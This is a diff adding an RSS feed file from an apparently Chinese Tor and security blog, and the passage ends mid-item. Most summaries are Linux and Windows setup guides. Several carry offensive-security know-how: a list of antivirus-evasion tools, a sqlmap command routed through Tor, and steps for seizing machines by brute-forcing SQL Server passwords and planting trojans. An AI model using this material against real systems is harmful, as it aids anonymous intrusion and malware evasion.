@@ -1,0 +1,257 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>操作系统 on 暗网探秘</title>
+    <link>https://anwangtanmi.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</link>
+    <description>Recent content in 操作系统 on 暗网探秘</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Wed, 04 Sep 2019 10:27:58 +0800</lastBuildDate>
+    <atom:link href="https://anwangtanmi.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Tor环境搭建&amp;tor链路IP限定配置</title>
+      <link>https://anwangtanmi.github.io/posts/84b07f23bb97d43b5088f87b1961dfd1/</link>
+      <pubDate>Wed, 04 Sep 2019 10:27:58 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/84b07f23bb97d43b5088f87b1961dfd1/</guid>
+      <description>Tor隐匿环境搭建 Author:HJY&#xA;[参考链接]&#xA;官方安装tor步骤说明 官方配置说明 背景信息 tor的配置文件的路径 /etc/tor tor服务的端口为9050，若使用Tor浏览器其配置端口为9150 tor本质是一个socks代理，而非HTTP代理，代码上需注意，可以使用Polipo实现HTTP代理转Socks代理 环境描述 基于ubuntu-1604，命令运行正常 网络链路: 本机公网IP -&amp;gt; Tor代理 -&amp;gt; 目标网络 本机公网IP -&amp;gt; 代理 -&amp;gt; Tor代理 -&amp;gt; 目标网络 注：在中国使用Tor服务，叠加一层前置代理会比较好。而Tor浏览器则是选择获取官方提供的网桥的方式。因此本教程是基于链路2的网络拓扑进行搭建。&#xA;安装Tor note: 需在超级权限下进行安装 note: 建议使用代理网络进行安装操作，否则访问源失败 对于Debian系统，安装只需apt install tor即可，Ubuntu本身的默认源里也存在tor,但比较过时，如果你不在意，那你只需apt-get install tor即可跳过下面的安装步骤.&#xA;Do not use the packages in Ubuntu’s universe. In the past they have not reliably been update.That means you could be missing stability and security fixes&#xA;&amp;gt;# apt install apt-transport-https 根据当前系统版本添加tor包源,参照官网安装指引，以ubuntu16为例&#xA;查看系统版本的命令&#xA;&amp;gt; head -n 1 /etc/issue &amp;gt;# vim /etc/apt/sources.</description>
+    </item>
+    <item>
+      <title>暗影精灵3&#43; ubuntu18.04 安装显卡驱动</title>
+      <link>https://anwangtanmi.github.io/posts/52594a9dd081d5ca21ff0b6cf009c87d/</link>
+      <pubDate>Sat, 24 Aug 2019 12:55:22 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/52594a9dd081d5ca21ff0b6cf009c87d/</guid>
+      <description>一、安装ubuntu18.04 因为我装的双系统，采用UEFI引导安装，https://ubuntu.com/download官网下载Ubuntu18.04.3LTS对应的镜像文件。&#xA;准备一个空U盘，将iso中的文件拷贝到u盘下，重启电脑，进入引导界面，installubuntu选项，按e进入编辑模式&#xA;找到quiet splash添加i915.modeste=0&#xA;nouveau.modeset=0 nomodeset后删除quiet splash&#xA;按f10进入，安装后重启，进入grub引导，进入ubuntu模式，cd到/etc/modprobe.d/&#xA;sudo gedit blacklist-nouveau.conf(新建一个文件)&#xA;在这个文件中加入4行&#xA;blacklist nouveau blacklist lbm-nouveau alias nouveau off alias lbm-nouveau off&#xA;然后更新内核&#xA;sudo update-initramfs -u&#xA;二、驱动安装 官网下载Geforce 1050ti对应的显卡驱动.run文件，ctrl_alt_f3进入命令行模式，进入自己的账户。&#xA;输入命令:sudo telinit 3，关闭X服务，X就是图形，&#xA;开始装: sudo ./.run文件，关键来了，在安装的过程中有个关于X服务的选项，一定要选No，如果选的yes或者安装完了进不去桌面&#xA;需要查看/etc/x11文件夹中是否有一个xorg.conf文件，如果有，则删除，这个文件夹是安装驱动时X服务选项选yes自动生成的，删掉就可以了。&#xA;安装完成后输入nvidia-smi查看显卡信息。&#xA;三、安装cuda10.1 官网下载cuda10.1的版本，执行.run文件,执行不了的话，添加chmod +x添加执行权限&#xA;sudo bash ./.run 不需要安装drivers，别的随便装&#xA;四、安装cudnn 找到对应的版本，下载cudnn libraries for linux对应的tar.gz,提取后是cuda文件夹，包含include和lib64&#xA;执行：sudo cp include/cudnn.h /usr/local/cuda/include和sudo cp lib64/libcudnn* /usr/local/cuda/lib64&#xA;安装完成！！！</description>
+    </item>
+    <item>
+      <title>【渗透测试工具集】令人敬畏的渗透测试工具等汇总杂烩</title>
+      <link>https://anwangtanmi.github.io/posts/2c5b747cee254825c7852c40e48a431d/</link>
+      <pubDate>Wed, 07 Aug 2019 23:36:13 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/2c5b747cee254825c7852c40e48a431d/</guid>
+      <description>原文链接：&#xA;https://blog.csdn.net/Fly_hps/article/details/89306104 刚刚在网上浏览找到的，发现一篇不错的渗透测试工具的文章，就转发来大家一起看看&#xA;匿名工具 I2P – 隐形互联网项目。 Nipe – 用于将所有流量从计算机重定向到Tor网络的脚本。 OnionScan – 通过查找Tor隐藏服务运营商引入的操作安全问题来调查Dark Web的工具。 Tor – 免费软件和洋葱路由覆盖网络，可帮助您防御流量分析。 每个浏览器都知道的内容 – 全面的检测页面，用于测试您自己的Web浏览器的隐私和身份泄漏配置。 dos-over-tor – Tor压力测试工具的概念验证拒绝服务。 kalitorify – 通过Tor为Kali Linux OS提供透明代理。 防病毒逃生工具 AntiVirus Evasion Tool（AVET） – 包含针对Windows机器的可执行文件的后处理漏洞，以避免被防病毒软件识别。 Hyperion – 用于32位可移植可执行文件的运行时加密程序（“PE .exes”）。 Shellter – 动态shellcode注入工具，以及有史以来第一个真正动态的PE infector。 UniByAv – 简单的混淆器，它使用原始shellcode并使用强制执行的32位XOR密钥生成反病毒友好的可执行文件。 面纱 – 生成绕过常见防病毒解决方案的metasploit有效负载。 peCloak.py – 自动隐藏来自防病毒（AV）检测的恶意Windows可执行文件的过程。 peCloakCapstone – peCloak.py自动恶意软件防病毒逃避工具的多平台分支。 shellsploit – 生成自定义shellcode，后门，注入器，可选择通过编码器对每个字节进行混淆。 图书 另见DEF CON建议阅读。&#xA;防御性编程书籍 Web开发人员的整体信息 – （分册0） Web开发人员的整体信息 – （分册1） 黑客手册系列丛书 Joshua J.</description>
+    </item>
+    <item>
+      <title>sqlmap 连接tor</title>
+      <link>https://anwangtanmi.github.io/posts/6c49d8c094177b8899b9412fd15e277f/</link>
+      <pubDate>Mon, 05 Aug 2019 11:41:07 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/6c49d8c094177b8899b9412fd15e277f/</guid>
+      <description>1.第一种可以安装tor 浏览器然后打开浏览器&#xA;说明tor server 开启成功 端口为127.0.0.1:9150 是一个socks5&#xA;然后sqlmap python sqlmap.py -u “xxxxx” –tor –check-tor –tor-port=9150 –tor-type=SOCKS5 使用pentest box里面的sqlmap并未成功 可能和版本有关系&#xA;第二种就是使用ipchanger工具开启,而且该工具不仅开启tor server服务还能实时自动切换ip端口为9050</description>
+    </item>
+    <item>
+      <title>kali使用tor网络进行socks5代理记录</title>
+      <link>https://anwangtanmi.github.io/posts/bc85b3d5a53e03f50921e056e8af3a04/</link>
+      <pubDate>Wed, 26 Jun 2019 16:15:13 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/bc85b3d5a53e03f50921e056e8af3a04/</guid>
+      <description>Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-2kali1 (2019-05-15) x86_64 GNU/Linux&#xA;试过下载linux版本的tor压缩包，但是安装不了&#xA;最后&#xA;apt-get install tor&#xA;root@kali:~# apt-get install tor 正在读取软件包列表... 完成 正在分析软件包的依赖关系树 正在读取状态信息... 完成 将会同时安装下列软件： tor-geoipdb torsocks 建议安装： mixmaster torbrowser-launcher tor-arm apparmor-utils obfs4proxy 下列【新】软件包将被安装： tor tor-geoipdb torsocks ... 正在设置 torsocks (2.3.0-2) ... 正在设置 tor-geoipdb (0.3.5.8-1) ... 正在处理用于 man-db (2.8.5-2) 的触发器 ... 正在处理用于 systemd (241-3) 的触发器 ... Scanning processes... Scanning linux images... Running kernel seems to be up-to-date. No services need to be restarted.</description>
+    </item>
+    <item>
+      <title>惠普暗影精灵4pro安装ubuntu16.04</title>
+      <link>https://anwangtanmi.github.io/posts/2b3391a141ec92bf38c2308a60e457e7/</link>
+      <pubDate>Wed, 12 Jun 2019 09:46:29 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/2b3391a141ec92bf38c2308a60e457e7/</guid>
+      <description> 前段时间和本科室友闲聊的过程中了解到它买了一台惠普暗影精灵4pro的游戏本，据他所说配置不错，性价比还可以，八千多就拿下电竞屏+RTX2060+I5+8G内存，配置看起来还可以。由于自身学习的原因，对显卡性能有要求，一直想买一台新电脑，再加上当时正处于五一期间，美国非农指数要公布了，这对于国际黄金和美元影响比较大，我跟我师傅、师兄弟姐妹们准备抓这一波行情，而全讯通只提供windowns下的软件安装包，因此我毫不犹豫就在京东下单购买了一台。&#xA;机器买回来除了那一次做国际黄金交易，好长一段时间都没有使用，直到近来有一个分布式系统项目的需求，才重拿起这台笔记本。系统需要在Ubuntu16.04下进行搭建，因此我在我的笔记本上装了Ubuntu16.04。&#xA;这一次装机比我想象中要复杂一些，踩了几次坑，网上各种搜，并没有获得相关答案。接下来说一下我装机的过程以及遇到的坑吧：&#xA;首先到官网上下载系统镜像，然后使用UltraISO制作启动盘 启动电脑，选择电脑从U盘启动 对Install Ubuntu这一项安e进行编辑模式，对于Linux开头的这一行，删掉末尾的—，并在splash后添加nomodeset，按F10保存启动系统 接下来根据系统引导一步一步来就好 安装完成，点击重启即可&#xA;在装机的过程中，重启后会发现无法启动，系统提示为未授权引导之类的，这是由于系统默认设置了安全启动模式，我们需要将其关闭，并清除密钥即可正常启动。只需要再次重启进入BIOS中关闭安全启动模式，并清除密钥即可。&#xA;装机前我特地查了一下这台笔记本装Ubuntu的过程，博客贴吧等都爆各种问题，有说什么显卡驱动问题，有说完全不支持Linux之类的，我前前后后折腾了好几遍，重启失败后重装，而且尝试用查到的方法去解决我的问题，然而最后并没有任何结果，最好仔细查看我的错误才把问题解决了。所以说，纸上得来终觉浅，绝知此事要躬下，不能人云亦云，真的得结合自身问题来，自己去折腾，别人的意见只能用来参考。&#xA;借着休息的时间水完了这篇博客，希望能够对其他游戏本或惠普暗影精灵4pro想装Linux的朋友有帮助！继续搬砖。 </description>
+    </item>
+    <item>
+      <title>惠普暗影精灵2 Mojave（几乎完美黑苹果）</title>
+      <link>https://anwangtanmi.github.io/posts/a407b1cd745414699bd8bf6e50e682e2/</link>
+      <pubDate>Sun, 05 May 2019 10:21:39 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/a407b1cd745414699bd8bf6e50e682e2/</guid>
+      <description> 惠普暗影精灵2 Mojave 新的改变 已知BUG Bug修复 1. 电池修复 2. 亮度调节修复正常 **Mac os（Mojave）的镜像百度即可！** Github开源地址 ====传送地址: [Mojave 暗影精灵2](https://github.com/Arecall/-Mac-os).==== 新的改变 2018年6月5日，在2018苹果全球开发者大会上，苹果发布了mac OS Mojave系统。&#xA;夜间模式 ，MacOS Mojave的夜间模式，不仅使UI变暗，&#xA;还切换壁纸，窗口边框和窗口内容，此外，XCode同样也支持夜间模式。用户可以自行设置夜晚模式，也可以由系统决定随时间自动启动。 桌面堆积，可以通过类型、日期、标签等进行分类，侧栏底部的新快速操作，可快速执行旋转图像等操作。几乎可以在任何文件视图中使用侧边栏。如果选择多个文件，它可以对所有文件执行操作，例如将它们组装成PDF。 画廊视图（Gallery View），可预览图片、视频、PPT、表格、PDF等，侧边栏支持完整元数据，右下角增加快捷工具栏可执行旋转等操作，侧边栏可以在几乎任何文件视图中使用，选择多个文件后可以执行整体操作如生成PDF。 截屏，功能非常丰富，就像在iOS上截图时角落里会出现大拇指图标，点击就会出现快速标记工具。 iOS应用登陆桌面 ，Apple News苹果新闻、Stock股票、Voice Memos语音备忘录、Home家庭都会来到macOS，基本上可以视为iPad版本，为此苹果从iOS上移植过来了一些关键框架。 HomeKit，可以在Mac上添加和管理HomeKit设备，依然支持Siri语音控制。 Quick Look，加入Markup，可以直接把签名拖拽到文档内。 Continuity Camera，可以直接将iPhone里已有或者拍摄的照片直接导入桌面文档，还可以扫描手机上的文档并发送结果。 安全和隐私，任何应用都默认受到保护。Safari减少对用户数据的追踪。网页信息追踪保护默认关闭。加强硬件指纹识别安全等级（iOS 12/macOS Mojave同步）。 应用商店，界面重新设计像iOS商店看齐，增加新的分类包括发现、创建、工作、游戏、开发、分类、更新，增加关于应用的故事（Stories）。&#xA;已知BUG WIFI模块不可用&#xA;2. 电池DDST有问题，未修复&#xA;3. 亮度调节需要外接键盘，使用Fn+亮度调节经行第一次矫正，以后直接使用后电脑键盘deFn+亮度调节。 Bug修复 1. 电池修复 2. 亮度调节修复正常 Mac os（Mojave）的镜像百度即可！ Github开源地址 传送地址: Mojave 暗影精灵2. </description>
+    </item>
+    <item>
+      <title>网络安全术语总结及解释说明</title>
+      <link>https://anwangtanmi.github.io/posts/58304d8d59ec408ba4ac72d8a8eed61c/</link>
+      <pubDate>Tue, 30 Apr 2019 20:27:49 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/58304d8d59ec408ba4ac72d8a8eed61c/</guid>
+      <description>文章目录 肉鸡/抓鸡 什么是肉鸡 肉鸡分类 什么是抓鸡 木马分类 蜜罐 暗网 如何访问到暗网 免杀 APT攻击 Exploit/POC 内网渗透 社会心理学 社工库 谷歌黑客 脱裤 提权 0(零)day攻击 旁站/C段 旁站 C段 肉鸡/抓鸡 什么是肉鸡 肉鸡就是被黑客攻破，种植了木马病毒，黑客可以随意操纵它并利用它做任何事情，就象傀儡。肉鸡可以是各种系统,如windows,linux,unix等。&#xA;肉鸡是中了木马，或者留了后门，可以被远程操控的机器，现在许多人把有WEBSHELL 权限的机器也叫肉鸡。很多电脑是几乎不设防的，很容易被远程攻击者完全控制。你的电脑就因此成为别人砧板上的肉，别人想怎么吃就怎么吃，肉鸡(机)一名由此而来。&#xA;以上就是抓到的”肉鸡”机器,可以拿来做跳板机/利用这些机器点击广告挣钱等…&#xA;肉鸡分类 家庭鸡:&#xA;价格便宜,有些买来利用摄像头窥探别人隐私&#xA;网吧机:&#xA;价格便宜,缺点就是不稳定,因为网吧有还原系统,使用几天就会掉线!所以价值不会太高&#xA;服务器:&#xA;根据服务器的操作系统来区分价格,价值比较高&#xA;什么是抓鸡 通过扫描弱口令/爆破/漏洞自动化种马达到控制机器&#xA;抓鸡过程 (1)搜寻/收集IP地址网段&#xA;(2)进行扫描端口号:如1433端口(还有3389/3306等端口)是否开放&#xA;(3)爆破sa密码(弱密码/有规律的密码)&#xA;(4)有了密码后就可以对数据库系统进行操作&#xA;(5)下一步就是开始下载种植木马了,&#xA;说明&#xA;sa的全称是super administrator 即超级管理员的意思。sa密码就是sql数据库的超级管理员的密码。&#xA;木马分类 计算机木马 网页木马 网页木马又分为以下三类:&#xA;大马 小马或 一句话木马 蜜罐 (1)　蜜罐技术本质上是一种对攻击方进行欺骗的技术,通过布置一些作为诱饵的主机,网络服务或信息,诱导攻击方对他们进行实施攻击,从而可以对攻击行为进行捕获和分析,了解攻击方所使用的工具与方法,推测攻击意图和动机,能够让防御方清晰地了解他们所面对的安全威胁,并通过技术和管理手段来挣钱实际系统的安全防护能力.&#xA;(2) 蜜罐好比是情报收集系统,蜜罐好像是故意让人攻击的目标,引诱黑客前来攻击,所以攻击者如前后,就可以知道攻击方如何得逞的,随时了解对服务器发动的最新攻击和漏洞,还可以通过窃听黑客之间的联系,手机黑客所用的种种工具,并且掌握他们的社交网络&#xA;暗网 互联网由三层网络组成&#xA;表示层网 深网 暗网 如何访问到暗网 LAN –&amp;gt; (表层网)表示层网 –&amp;gt; 深网 –&amp;gt; 暗网</description>
+    </item>
+    <item>
+      <title>win10共享文件夹</title>
+      <link>https://anwangtanmi.github.io/posts/025ae216af14fe626297793fd8928abd/</link>
+      <pubDate>Mon, 22 Apr 2019 22:45:53 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/025ae216af14fe626297793fd8928abd/</guid>
+      <description>两台机器在同一网段内，互联或者连接同一路由器&#xA;\\192.168.1.100\share</description>
+    </item>
+    <item>
+      <title>metasploit魔鬼训练营学习笔记-6-2web应用渗透技术之漏洞扫描神器W3AF</title>
+      <link>https://anwangtanmi.github.io/posts/2339ba87d7f29d28541dfd2e761fadac/</link>
+      <pubDate>Tue, 26 Mar 2019 18:41:28 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/2339ba87d7f29d28541dfd2e761fadac/</guid>
+      <description>一、扫描神器W3AF（Web Application Attack and Audit Framework）&#xA;1.W3AF简介&#xA;W3AF是阿根廷人Andres Riancho创建的一个开源项目，目标是成为一个Web应用攻击和统计的平台。目前W3AF分为主要两个部分——核心模块和插件部分。&#xA;核心模块负责进程的调度和插件的使用，插件部分则负责查找并攻击Web安全漏洞。&#xA;插件部分根据功能的不同，又分为8类模块，包括：发现模块、审计模块、搜索模块、攻击模块、输出模块、修改模块、入侵模块、破解模块，他们之间的运行关系如图：&#xA;2.各模块的功能&#xA;（1）发现模块&#xA;负责查找HTTP信息，并探测服务器、数据库、web应用防火墙等信息例如halberd、hmap、afd、fingetprint等信息。在发现模块中，最重要的插件是webSpider，它基于爬虫技术爬取网站的每个链接和表单，这是进行漏洞探测不可或缺的信息。&#xA;（2）暴力破解&#xA;破解哪些需要认证的页面，在发现过过程中，经常会遇到认证登陆页面，暴力破解模块支持对基本认证机制的破解（需要配置字典），以及表单登陆机制的暴力破解。&#xA;（3）审计模块&#xA;探测漏洞的模块，W3AF支持目前主流的web应用漏洞类型的探测，例如SQLi、XSS等，探测漏洞的方法也是多种多样的，例如模式匹配、基于显示错误的方法、基于时间延迟的方法、远程创建、响应差别（如采用不同的参数输入AND 1=1、AND 1=2）等，当确定存在安全漏洞的同时，存在漏洞的URL会被保存，等待攻击模块对它实施攻击。&#xA;（4）搜索Grep&#xA;捕获HTTP请求与应答过程中的一些关注信息（例如IP、Email地址、信用卡信息等），它仅能用来分析数据，统统是修改模块允许使用者基于正则表达式修改相关的请求和应答消息。&#xA;（5）攻击模块&#xA;用来读取前面扫描获取的扫描信息，然后试图通过该类模块中的各种插件来攻击安全漏洞，例如：sql_webshell、advshell、sqlmap、xssbeef、remote file include shell、os command shell等。&#xA;3.W3AF使用</description>
+    </item>
+    <item>
+      <title>【双系统安装心得】【win10&#43;Ubuntu18.04】【Ubuntu安装卡死/登录卡死问题】【NVIDIA网卡驱动安装问题】</title>
+      <link>https://anwangtanmi.github.io/posts/75071c7d419f77bf4c45c3507f3bf2ad/</link>
+      <pubDate>Thu, 21 Feb 2019 21:41:39 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/75071c7d419f77bf4c45c3507f3bf2ad/</guid>
+      <description>本人经过一整天的折腾QAQ&#xA;就为了Ubuntu的两个最重要的驱动安装（无线网卡驱动+独立显卡驱动）&#xA;搞得心态都炸了好几次 神烦！！（(╯‵□′)╯︵┻━┻）&#xA;所以特地写一篇博文 把我期间遇到的一些问题进行总结 希望能让遇到同样问题的朋友少走一些弯路。&#xA;【最重要的一点！！！所以写在最开头！！！】&#xA;【一定要先进入BIOS，把secure root关闭！！！】&#xA;中文是 安全启动模式 记得一定要先关闭！！！&#xA;1.Ubuntu安装卡死问题&#xA;在进入引导U盘以后，开始安装以前，有个选项是 *install Ubuntu，这里先不要进入，按“e”进入编辑，找到以linux开头的那行，将“quite splash – – -”改为“quite splash nomodeset”，然后按F10引导进入安装，就不会卡了。&#xA;2.登录卡死问题&#xA;双系统我安装完以后，是Ubuntu引导win10，在选择系统的界面，同理，Ubuntu，按“e”进去编辑，修改内容同上条。&#xA;3.无线网卡驱动&#xA;我的笔记本是暗影精灵3，我安装了Ubuntu以后，通过命令查看电脑的网卡设备，发现并不是百度说的那样，有eth0，wlan0这样的命名。比如如果命名是eth0，eth1，则eth0表示有线网卡，eth1表示无线网卡。【未完待续（等我整理完，再更新一些内容）】&#xA;查询命令参考：iwconfig，ifconfig&#xA;我的无线网卡型号是b822，这个型号的驱动文件Ubuntu已经有了，我关掉BIOS安全启动（secure boot），reboot以后WiFi就能用了。【未完待续（补查询型号的操作过程）】&#xA;4.NVIDIA显卡驱动&#xA;这个我遇到的最大的问题就是NVIDIA显卡驱动安装好以后和Ubuntu默认的nouveau驱动会冲突，导致重启的时候出现下图的问题，无法进入系统。【未完待续（补寻找显卡驱动版本以及安装过程）】&#xA;这里我也手打一下这个问题描述，便于遇到同样问题的朋友搜索。（我当时真的搜不到啊QAQ）&#xA;acpi INT3400:00: Unsupported event [0x86]&#xA;acpi INT3400:00: Unsupported event [0x86]&#xA;acpi INT3400:00: Unsupported event [0x86]&#xA;acpi INT3400:00: Unsupported event [0x86]&#xA;acpi INT3400:00: Unsupported event [0x86]&#xA;解决方法：强制关机，在启动之前，选择系统的时候，找到“ Ubuntu ”，按“ e ”进入编辑，将“ quiet splash nomodeset ”修改成“ quiet splash acpi=off ”，按F10引导启动。</description>
+    </item>
+    <item>
+      <title>使用Windows server 2016 进行PXE装机</title>
+      <link>https://anwangtanmi.github.io/posts/d1629e0c86ba7aaeec45b8d370ae2c30/</link>
+      <pubDate>Mon, 11 Feb 2019 14:23:33 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/d1629e0c86ba7aaeec45b8d370ae2c30/</guid>
+      <description>网络设置成桥接模式,并为物理机网卡配置一个静态ip 为server16 设置静态ip(要和物理机处于同一网段) c&#xA;打开开始菜单–&amp;gt;服务器管理器(默认会弹出) 2.选择添加角色&#xA;3.一直点下一步,选择安装DHCP和Windows部署服务&#xA;4.选择Windows部署服务控制台&#xA;5.选择属性,按照如下配置&#xA;6.选择我们的镜像文件,右键,装载&#xA;7.回到Windows 部署服务,在安装映象处右键,添加安装映象,然后点下一步&#xA;8.选择安装文件(镜像文件挂载的盘符,找到sourcesinstall.wim)&#xA;9.安装启动映象,跟映像文件操作一样,不多啰嗦(唯一的区别就是第8步的sourcesinstall.wim换成sourcesBoot.wim)&#xA;10.配置DHCP–&amp;gt;选择DHCP管理器&#xA;11.新建作用域–&amp;gt;下一步–&amp;gt;下一步(随便起一个名字就行)–&amp;gt;输入要分配的ip(ip要和设置的静态ip处于同一网段),下一步–&amp;gt;输入网关地址,然后一直点下一步&#xA;此时,pxe已经配置完成&#xA;输入server16的用户名,密码(以第一种格式输入)</description>
+    </item>
+    <item>
+      <title>解决笔记本或者联想小新，用着用着忽然熄屏或者黑屏的问题</title>
+      <link>https://anwangtanmi.github.io/posts/d3477767dc460337995baac59b7ad918/</link>
+      <pubDate>Wed, 02 Jan 2019 21:38:18 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/d3477767dc460337995baac59b7ad918/</guid>
+      <description>经过仔细摸索&#xA;是由于电池跳电导致了，系统误判，从而导致休眠或者睡眠。&#xA;需要在电源选项，里面选择更改计划设置，更改高级电源设置，如下，展开电池选项，&#xA;按下图设置阀值，或者更小的值，避免电脑误判。&#xA;可以使用途中的阀值，&#xA;另外如果还是出现黑屏，则需要找到联想官网，技术支持，去搜索下载对应你的型号的BIOS，经过安装之后，&#xA;你会发现这个问题就解决了。</description>
+    </item>
+    <item>
+      <title>Win10共享文件夹的简易方法</title>
+      <link>https://anwangtanmi.github.io/posts/3940452c2c689ce6ec344d3b208f6186/</link>
+      <pubDate>Mon, 17 Dec 2018 00:27:33 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/3940452c2c689ce6ec344d3b208f6186/</guid>
+      <description>WIN10共享文件夹简易方法 我是憧憬少。&#xA;这是在CSDN的第一篇博客，也是我第一篇正式的博客。&#xA;我们的linux老师上课时用到了共享文件夹，于是我就百度学习了一下。&#xA;来写一下刚刚学到的共享文件夹的方法。&#xA;共享方法 首先右键你想要共享的文件夹，【共享】-&amp;gt;【特定用户】&#xA;2.在选择框里面选择Everyone，接着点击旁边的【添加】&#xA;3.调整权限后，点击【共享】即可&#xA;4.共享完成&#xA;别人进入共享文件夹的方法 1.你可以复制系统给你的链接给局域网内（我只试过局域网）的别人，让他复制到文件资源管理器地址栏（图弄错了，是把括号里面的地址输进去，而不包括名字）&#xA;2.或者找到资源管理器最左下角的【网络】，让他点进去就是了。&#xA;点进去之后的效果是这样：&#xA;然后你就可以用这个文件夹和局域网里的各位来分享文件了。</description>
+    </item>
+    <item>
+      <title>关于隐身tor</title>
+      <link>https://anwangtanmi.github.io/posts/a5de141416c122d909cac3eff41cf67f/</link>
+      <pubDate>Fri, 16 Nov 2018 15:05:18 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/a5de141416c122d909cac3eff41cf67f/</guid>
+      <description>简介 （复制某站）请遵守网络安全法请勿用于非法用途 Tor最近发布了一层新的安全保护。新的变更包括加密运算法、经过改良的身份验证和重新设计的目录系统。最重要的是，新的洋葱域名将更长，以使洋葱地址保持完全隐匿。 首要须知：什么是Tor? 如果您已经开始阅读这篇文章，您有可能听说Tor，并想知道您是否应该使用它。所以让我们从基本知识开始讲解：究竟什么是Tor？&#xA;Tor是”洋葱路由器”（The Onion Router）的缩写，指的是用于保护隐私的多层加密。Tor的基本功能是隐藏您的互联网足迹，让您可匿名浏览网页和下载。&#xA;然而，我们必须厘清的是，Tor不是一个VPN或一个内建VPN的浏览器。虽然Tor和VPN都允许私人浏览互联网，但它们是非常不同的技术。&#xA;Tor最初是由美国海军在情报行动中为保护美国政府的通讯安全所开发的。现在它是一个促进在线隐私的非盈利组织。&#xA;Tor最近发布了一层新的安全保护。新的变更包括加密运算法、经过改良的身份验证和重新设计的目录系统。最重要的是，新的洋葱域名将更长，以使洋葱地址保持完全隐匿。 首要须知：什么是Tor? 如果您已经开始阅读这篇文章，您有可能听说Tor，并想知道您是否应该使用它。所以让我们从基本知识开始讲解：究竟什么是Tor？&#xA;Tor是”洋葱路由器”（The Onion Router）的缩写，指的是用于保护隐私的多层加密。Tor的基本功能是隐藏您的互联网足迹，让您可匿名浏览网页和下载。&#xA;然而，我们必须厘清的是，Tor不是一个VPN或一个内建VPN的浏览器。虽然Tor和VPN都允许私人浏览互联网，但它们是非常不同的技术。&#xA;Tor最初是由美国海军在情报行动中为保护美国政府的通讯安全所开发的。现在它是一个促进在线隐私的非盈利组织。&#xA;Tor最近发布了一层新的安全保护。新的变更包括加密运算法、经过改良的身份验证和重新设计的目录系统。最重要的是，新的洋葱域名将更长，以使洋葱地址保持完全隐匿。 首要须知：什么是Tor? 如果您已经开始阅读这篇文章，您有可能听说Tor，并想知道您是否应该使用它。所以让我们从基本知识开始讲解：究竟什么是Tor？&#xA;Tor是”洋葱路由器”（The Onion Router）的缩写，指的是用于保护隐私的多层加密。Tor的基本功能是隐藏您的互联网足迹，让您可匿名浏览网页和下载。&#xA;然而，我们必须厘清的是，Tor不是一个VPN或一个内建VPN的浏览器。虽然Tor和VPN都允许私人浏览互联网，但它们是非常不同的技术。&#xA;Tor最初是由美国海军在情报行动中为保护美国政府的通讯安全所开发的。现在它是一个促进在线隐私的非盈利组织。&#xA;为何使用Tor? Tor网络通过不同的Tor服务器来移动您的互联网活动并解此隐藏您的身份。&#xA;其为您提供完整的匿名性和安全性，以阻绝任何试图跟踪您活动的人（例如政府、黑客和广告商）。&#xA;Tor也是进入“深层网络”或“暗黑网络”的途径，这听起来比事情更骇人。实际上，深层网络大部分是由一般互联网组成。&#xA;深层网络由基于某种原因没有在任何搜索引擎上注册的网站组成。&#xA;虽然其中很多人仅是因为不小心而未登记，但某些人未登记确实是因为不想轻易被找到。例如，几年前被关闭的线上贩毒市场“丝绸之路”（Silk Road）即无法经由普通网页浏览器进入。&#xA;冰山常被用来比喻深层网络：透过标准搜索引擎仅可搜索到冰山的一角，而表面下便是互联网其余的部分或深层网络。&#xA;但Tor不单被用来从事网络上的非法活动。其也非常受到记者、社运人士、维权人士和揭密者 –特别是那些在互联网限制森严的国家生活或工作的人–等人士欢迎。&#xA;为什么不使用Tor？ Tor最大的缺点是其性能– 或缺乏性能。&#xA;由于Tor的数据经过众多中继，因此Tor的速度非常缓慢，特别是在影音方面。这可能会让串流传输或下载变成噩梦一场，而这也是多数用户使用VPN或内建VPN浏览器的主要原因之一。&#xA;知道使用Tor并不能让您100％无懈可击也很重要。&#xA;事实上，许多人认为Tor相当容易被黑客攻击，因为如果您访问的网站不使用SSL，则出口节点（您的信息到达目的地之前的最后一个中继站）仍可以看到您的流量。使用HTTPS仅可以增加一层额外的保护，但仍不是万无一失。&#xA;最后一点是，政府机构可以看到您是否在使用Tor，所以即使他们看不到您在做什么，他们仍然可能盯上您。&#xA;————————————————————————————————————————————-————————————&#xA;在kali linux系统下配置 其他发行版类似 安装 apt-get install tor 启动 tor #直接启动 守护进程启动 service tor start 在国内启动tor是没办法使用的，因为屏蔽掉了 找不到节点。要结合VPN来使用首先你要有国外的服务器搭建OpenVPN&#xA;OpenVPN要走TCPhttps:443端口 配置所有流量都走OpenVPN tor #启动 #可使用proxychains 实现任意代理 在配置文件最后一行加入 socks5 127.0.0.1 9050 #链接tor网络 另一种方式是使用任意代理 使用proxychains /etc/proxychains.</description>
+    </item>
+    <item>
+      <title>开源漏洞扫描器合集</title>
+      <link>https://anwangtanmi.github.io/posts/c2539df1464dcaebf17862349e1fb935/</link>
+      <pubDate>Tue, 30 Oct 2018 15:10:53 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/c2539df1464dcaebf17862349e1fb935/</guid>
